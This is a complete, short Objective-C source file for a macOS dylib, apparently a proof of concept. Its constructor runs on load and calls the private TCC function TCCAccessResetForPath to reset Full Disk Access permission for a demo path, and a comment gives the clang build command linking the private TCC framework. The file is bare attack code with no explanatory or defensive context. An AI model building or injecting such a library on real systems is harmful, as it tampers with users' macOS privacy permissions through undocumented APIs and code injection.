#import <Foundation/Foundation.h>

extern int TCCAccessResetForPath(NSString *service, NSString *path);

__attribute__((constructor))
void init(void)
{
        NSString *svc = @"kTCCServiceSystemPolicyAllFiles";
        NSString *path = [NSString stringWithFormat: @"/Users/admin/Downloads/demo"];
        int res = TCCAccessResetForPath(svc, path);

        NSLog(@"Arg0: %@, Arg1: %@, Res: %i", svc, path, res);
}

// clang -shared -framework Foundation -framework TCC -F /System/Library/PrivateFrameworks lib.m -o lib.dylib
